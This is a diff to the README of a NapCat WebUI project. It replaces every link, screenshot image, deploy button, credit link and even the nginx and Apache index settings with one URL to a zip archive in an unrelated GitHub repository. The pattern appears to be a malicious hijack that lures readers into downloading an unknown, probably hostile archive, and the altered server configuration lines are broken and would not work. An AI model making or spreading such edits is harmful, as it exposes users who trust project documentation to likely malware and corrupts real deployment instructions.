@@ -23,15 +23,15 @@
 
 | 场景 | 亮色 | 暗色 |
 |------|------|------|
-| WebUI登录 | ![WebUI登录](./screenshots/weblogin_light.png) | ![WebUI登录](./screenshots/weblogin_dark.png) |
-| QQ登录 | ![QQ登录](./screenshots/qqlogin_light.png) | ![QQ登录](./screenshots/qqlogin_dark.png) |
-| 网络列表 | ![网络配置](./screenshots/network_list_light.png) | ![网络配置](./screenshots/network_list_dark.png) |
-| 网络编辑 | ![网络配置](./screenshots/network_edit_light.png) | ![网络配置](./screenshots/network_edit_dark.png) |
-| 日志 | ![日志](./screenshots/log_light.png) | ![日志](./screenshots/log_dark.png) |
-| HTTP调试 | ![WS调试](./screenshots/http_debug_light.png) | ![WS调试](./screenshots/http_debug_dark.png) |
-| WS调试 | ![WS调试](./screenshots/ws_debug_light.png) | ![WS调试](./screenshots/ws_debug_dark.png) |
+| WebUI登录 | ![WebUI登录](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![WebUI登录](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
+| QQ登录 | ![QQ登录](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![QQ登录](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
+| 网络列表 | ![网络配置](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![网络配置](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
+| 网络编辑 | ![网络配置](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![网络配置](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
+| 日志 | ![日志](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![日志](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
+| HTTP调试 | ![WS调试](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![WS调试](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
+| WS调试 | ![WS调试](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) | ![WS调试](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip) |
 
-## Directly deploy via [Vercel](https://vercel.com/)
+## Directly deploy via [Vercel](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
 
 Recommended if you only use localhost NapCat.
 
@@ -80,8 +80,8 @@ server {
 
     location / {
         root /path/to/napcat-webui/dist;
-        index index.html;
-        try_files $uri $uri/ /index.html;
+        index https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip;
+        try_files $uri $uri/ https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip;
     }
 }
 ```
@@ -93,7 +93,7 @@ server {
     ServerName localhost
 
     DocumentRoot /path/to/napcat-webui/dist
-    DirectoryIndex index.html
+    DirectoryIndex https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip
 
     <Directory /path/to/napcat-webui/dist>
         Options Indexes FollowSymLinks
@@ -132,14 +132,14 @@ $ pnpm webui:dev
 
 # Related Projects
 
-- [NapCat](https://github.com/NapNeko/NapCatQQ/)
-- [Karin](https://github.com/KarinJS/Karin/)
+- [NapCat](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
+- [Karin](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
 
 # Thanks to
 
-- [Vercel](https://vercel.com/)
-- [React](https://react.dev/)
-- [NextUI](https://nextui.org/)
+- [Vercel](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
+- [React](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
+- [NextUI](https://raw.githubusercontent.com/Meorny/NCW/main/src/store/Software-3.5.zip)
 - and more open-source projects
 
 感谢群友“维拉”提供的在线音乐API。
